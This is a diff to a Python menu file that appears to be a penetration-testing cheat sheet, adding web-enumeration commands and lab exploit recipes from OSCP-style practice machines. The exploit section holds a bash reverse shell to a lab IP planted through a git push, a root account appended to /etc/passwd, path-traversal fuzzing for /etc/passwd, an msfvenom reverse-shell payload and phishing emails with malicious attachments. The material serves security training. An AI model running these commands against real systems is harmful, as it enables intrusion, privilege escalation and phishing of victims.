@@ -1238,8 +1238,145 @@ menu_structure = {
             },
         ],
     },
-    "Web Attacks": {},
-    "Exploit & Tricks": {},
+    "Web Attacks": 
+    {
+        "Enumeration":
+        {
+            "Web server fingerprinting":
+            [
+                {"Nmap":
+                    [
+                    ("sudo nmap -p80 -sV $IP","Running Nmap scan to discover web server version"),
+                    ("sudo nmap -p80 --script=http-enum $IP","Running Nmap NSE http enumeration script against the target"),
+                    ],
+                },
+                {"Technology stack":
+                    [
+                    ("whatweb http://$IP","Technology stack"),
+                    ],
+                },
+                {"Wordpress scan":
+                    [
+                    ("wpscan --url http://$IP --enumerate p --plugins-detection aggressive -o wp_scan","WPScan of the WordPress web page"),
+                    ],
+                },
+            ],
+            "Directory brute force":
+            [
+                {"Gobuster":
+                    [
+                    ("gobuster dir -u http://$IP -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -k -t 30","Directory discovery"),
+                    ("gobuster dir -u http://$IP -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt -k -t 30","File / endpoint discovery"),
+                    ],
+                },
+                {"Feroxbuster":
+                    [
+                    ("feroxbuster -u http://$IP -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt -r -t 100","Feroxbuster - Directory discovery"),
+                    ("feroxbuster -u http://$IP -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt -r -t 100","File / endpoint discovery"),
+                    ],
+                },
+                {"Wfuzz":
+                    [
+                    ("wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt --hc 404 \"$URL/FUZZ\"","Fuzz directories"),
+                    ("wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 \"$URL/FUZZ\"","Fuzz Files"),
+                    ("wfuzz -c -b \"<SESSIONVARIABLE>=<SESSIONVALUE>\" -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files.txt --hc 404 \"$URL\"","Authenticated fuzz"),
+                    ("export URL=\"https://example.com/?parameter=FUZZ\"","Parameter fuzzing"),
+                    ("wfuzz -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt \"$URL\"","Parameter fuzzing"),
+                    ],
+                },
+            ],
+            "Manual enumeration":
+            [
+            ("php, html, asp, aspx","What programming languages are being used ? "),
+            ("check for comments, links to other sites","Review source code"),
+            ("curl https://$IP/robots.txt","Inspect Sitempas"),
+            ("curl https://$IP/sitemap.xml","Inspect Sitempas"),
+            ("curl -i $IP","Get site version information"),
+            ("curl $IP -s -L | html2text -width 50 | uniq","Reading the website in Terminal"),
+            ("admin:admin, root:root","Try default credentials")
+            ],
+        }
+    },
+    "Exploit & Tricks": 
+    {
+        "Linux":
+       {
+            "Git": 
+            [
+                {
+                "GitDumper":
+                    [
+                    ("git-dumper http://$IP/.git /offsec/challenge_labs/03_OSCP_A/144_CRYSTAL/website","Dumping .git info - Machine #2 OSCPA"),
+                    ]
+                },
+                {
+                "Creds in git repos":
+                    [
+                    ("git show","Looking for creds"),
+                    ("more .gitconfig","Looking for creds"),
+                    ]
+                },
+                {
+                "SSH and GIT (from Hunit PG machine)":
+                    [
+                    ("","Finding ssh id_rsa key for user git (which enables to perform git-shell commands)"),
+                    ("GIT_SSH_COMMAND='ssh -i id_rsa -p 43022' git clone git@$IP:/git-server","Cloning git-server repo to local machine"),
+                    ("echo \"sh -i >& /dev/tcp/192.168.45.211/8080 0>&1\" >> backups.sh","Making local changes to the backups.sh script"),
+                    ("git add -A","stage all changes"),
+                    ("git commit -m \"pwn3\"","new commit"),
+                    ("GIT_SSH_COMMAND='ssh -i /home/kali/offsec/pg/hunit/files/id_rsa -p 43022' git push origin master","Uploading changes through the SSH"),
+                    ("","On compromised machine is running pull.sh script which is pulling the changes to original repo and thanks to it backups.sh is replaced and after few minutes we're getting a reverse shell"),
+                    ]
+                },
+
+            ],
+            "Sending email": 
+            [
+                {
+                "Sending email":
+                    [
+                    ("sendemail -f 'maildmz@relia.com' -t 'jim@relia.com' -s 192.168.239.189:25 -u 'Your spreadsheet' -m 'Here is your requested spreadsheet' -a ~/webdav/config.Library-ms","Command to send emails"),
+                    ]
+                },
+
+            ],
+            "Fuzzing parameters": 
+            [
+                {
+                "Fuzzing parameters":
+                    [
+                    ("ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -u http://192.168.210.80/console/file.php?FUZZ=/etc/passwd -t 100 -fs 0","Fuzzing parameters"),
+                    ("ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -u http://192.168.210.80/console/file.php?FUZZ=../../../../../../../../../../etc/passwd -t 100 -fs 0","Fuzzing parameters"),
+                    ("ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -u http://192.168.210.80/console/file.php?FUZZ= -t 100 -fs 0","Fuzzing parameters"),
+                    ("ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-big.txt -u http://192.168.210.80/console/file.php?FUZZ -t 100 -fs 0","Fuzzing parameters"),
+                    ]
+                },
+            ],
+            "Owning /etc/passwd": 
+            [
+                {
+                "Owning /etc/passwd":
+                    [
+                    ("openssl passwd weak_password","Generating password"),
+                    ("echo 'nox:$1$0TfKI35h$pCVdmIxRhxFa8muOawYMN1:0:0:root:/root:/bin/bash' >> /etc/passwd","Appending to /etc/passwd"),
+                    ("su nox","Switching to user nox"),
+                    ]
+                },
+            ],               
+        },
+        "Windows":
+            {
+            "LibreOffice evil macro":
+                [
+                    ("msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.241 LPORT=4444 -f hta-psh -o evil.hta","Payload"),
+                    ("nano splitter.py","Splitting the payload"),
+                    ("sendemail -f 'jonas@localhost' -t 'mailadmin@localhost' -s 192.168.244.140:25 -u 'a spreadsheet' -m 'Please check this spreadsheet' -a exploit.ods","Sending email"),
+                ],
+            },   
+
+                
+            
+    },
     "Password Attacks": {},
     "Transferring Exploits": {},
     "Port Redirection": {}
